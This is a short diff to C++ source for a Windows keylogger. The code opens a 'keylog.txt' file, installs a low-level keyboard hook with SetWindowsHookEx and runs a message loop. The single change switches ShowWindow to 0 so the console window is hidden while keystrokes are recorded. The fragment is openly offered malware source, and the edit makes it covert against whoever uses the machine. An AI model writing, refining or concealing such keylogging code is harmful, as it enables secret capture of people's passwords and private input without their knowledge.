@@ -90,7 +90,7 @@ int main (){
 	
 	textfile.open("keylog.txt", std::ios::out | std::ios::trunc);
 	printf("Hooking the keyboard...\n");
-  ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // 1 == Visible Window & 2 == Invisible Window
+  ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // 1 == Visible Window & 0 == Invisible Window
 	keyboardhook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
 	MSG msg;
 	while (GetMessage(&msg, NULL, 0, 0) != 0);
